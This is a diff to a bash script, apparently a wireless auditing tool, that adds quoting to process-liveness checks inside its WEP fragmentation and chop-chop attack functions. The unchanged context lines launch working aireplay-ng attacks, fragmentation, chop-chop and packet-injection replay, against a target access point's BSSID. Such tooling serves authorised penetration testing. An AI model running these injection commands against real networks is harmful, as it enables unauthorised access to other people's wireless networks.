@@ -1673,8 +1673,8 @@ function wep_fragmentation_attack() {
 			if grep "Now you can build a packet" "${tmpdir}${wepdir}fragmentation_output.txt" > /dev/null 2>&1; then
 				wep_fragmentation_phase=2
 			else
-				wep_fragmentation_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_fragmentation_phase1_pid} 2> /dev/null | head -n 1)
-				if [[ ${wep_fragmentation_launched} -eq 0 ]] || [ -z ${wep_fragmentation_phase1_pid_alive} ]; then
+				wep_fragmentation_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep "${wep_fragmentation_phase1_pid}" 2> /dev/null | head -n 1)
+				if [[ ${wep_fragmentation_launched} -eq 0 ]] || [ -z "${wep_fragmentation_phase1_pid_alive}" ]; then
 					wep_fragmentation_launched=1
 					recalculate_windows_sizes
 					xterm -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (${wep_fragmentation_phase}/3)" -e "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" > /dev/null 2>&1 &
@@ -1691,7 +1691,7 @@ function wep_fragmentation_attack() {
 			wep_fragmentation_phase=3
 		;;
 		3)
-			wep_fragmentation_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_fragmentation_phase2_pid} 2> /dev/null | head -n 1)
+			wep_fragmentation_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep "${wep_fragmentation_phase2_pid}" 2> /dev/null | head -n 1)
 			if [ -z ${wep_fragmentation_phase2_pid_alive} ]; then
 				recalculate_windows_sizes
 				xterm -hold -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (${wep_fragmentation_phase}/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" > /dev/null 2>&1 &
@@ -1712,8 +1712,8 @@ function wep_chopchop_attack() {
 			if grep "Now you can build a packet" "${tmpdir}${wepdir}chopchop_output.txt" > /dev/null 2>&1; then
 				wep_chopchop_phase=2
 			else
-				wep_chopchop_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_chopchop_phase1_pid} 2> /dev/null | head -n 1)
-				if [[ ${wep_chopchop_launched} -eq 0 ]] || [ -z ${wep_chopchop_phase1_pid_alive} ]; then
+				wep_chopchop_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep "${wep_chopchop_phase1_pid}" 2> /dev/null | head -n 1)
+				if [[ ${wep_chopchop_launched} -eq 0 ]] || [ -z "${wep_chopchop_phase1_pid_alive}" ]; then
 					wep_chopchop_launched=1
 					recalculate_windows_sizes
 					xterm -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (${wep_chopchop_phase}/3)" -e "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" > /dev/null 2>&1 &
@@ -1731,7 +1731,7 @@ function wep_chopchop_attack() {
 		;;
 		3)
 			wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_chopchop_phase2_pid} 2> /dev/null | head -n 1)
-			if [ -z ${wep_chopchop_phase2_pid_alive} ]; then
+			if [ -z "${wep_chopchop_phase2_pid_alive}" ]; then
 				recalculate_windows_sizes
 				xterm -hold -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (${wep_chopchop_phase}/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" > /dev/null 2>&1 &
 				wep_processes+=($!)
